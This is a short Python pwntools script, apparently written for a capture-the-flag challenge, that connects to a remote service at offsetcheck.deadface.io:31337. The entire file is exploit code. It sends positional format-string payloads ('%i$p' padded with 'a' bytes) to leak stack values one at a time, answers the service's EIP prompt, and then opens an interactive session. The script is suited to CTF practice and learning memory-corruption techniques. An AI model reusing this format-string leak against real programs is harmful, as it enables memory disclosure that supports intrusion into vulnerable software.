from pwn import *
import string

target = remote('offsetcheck.deadface.io', 31337)

for i in range(1, 80):
    print(target.recvuntil(b'sent to the buffer:'))
    payload = b'%' + str(i).encode('ascii') + b'$p'   
    print(payload)
    payload += b'a' * (100 - len(payload))
    target.sendline(payload)

    (target.recvuntil(b'Please enter what showed up in EIP:'))
    target.sendline(b'b')

target.interactive()